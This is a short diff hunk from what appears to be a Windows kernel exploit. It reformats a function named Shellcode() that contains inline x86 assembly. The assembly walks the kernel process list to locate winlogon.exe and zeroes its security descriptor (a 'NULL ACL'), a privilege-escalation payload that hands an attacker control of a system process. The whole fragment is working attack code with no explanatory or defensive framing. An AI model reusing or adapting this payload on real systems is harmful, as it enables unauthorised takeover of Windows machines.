@@ -187,20 +187,21 @@ void *kernelHandle;
 __declspec(noinline) int Shellcode()
 {
     // return MessageBoxA(NULL,"Boom","boom",0);
-    __asm {
-		mov eax, kernelHandle // WND - Which window? Check this
-		mov eax, [eax+8] // THREADINFO
-		mov eax, [eax] // ETHREAD
-		mov eax, [eax+0x150] // KPROCESS
-		mov eax, [eax+0xb8] // flink
-		procloop:
-		lea edx, [eax-0xb8] // KPROCESS
-		mov eax, [eax]
-		add edx, 0x16c // module name
-		cmp dword ptr [edx], 0x6c6e6977 // “winl” for winlogon.exe
-		jne procloop
-		sub edx, 0x170
-		mov dword ptr [edx], 0x0 // NULL ACL
+    __asm 
+    {
+	mov eax, kernelHandle // WND - Which window? Check this
+	mov eax, [eax+8] // THREADINFO
+	mov eax, [eax] // ETHREAD
+	mov eax, [eax+0x150] // KPROCESS
+	mov eax, [eax+0xb8] // flink
+	procloop:
+	lea edx, [eax-0xb8] // KPROCESS
+	mov eax, [eax]
+	add edx, 0x16c // module name
+	cmp dword ptr [edx], 0x6c6e6977 // “winl” for winlogon.exe
+	jne procloop
+	sub edx, 0x170
+	mov dword ptr [edx], 0x0 // NULL ACL
     }
 }
 
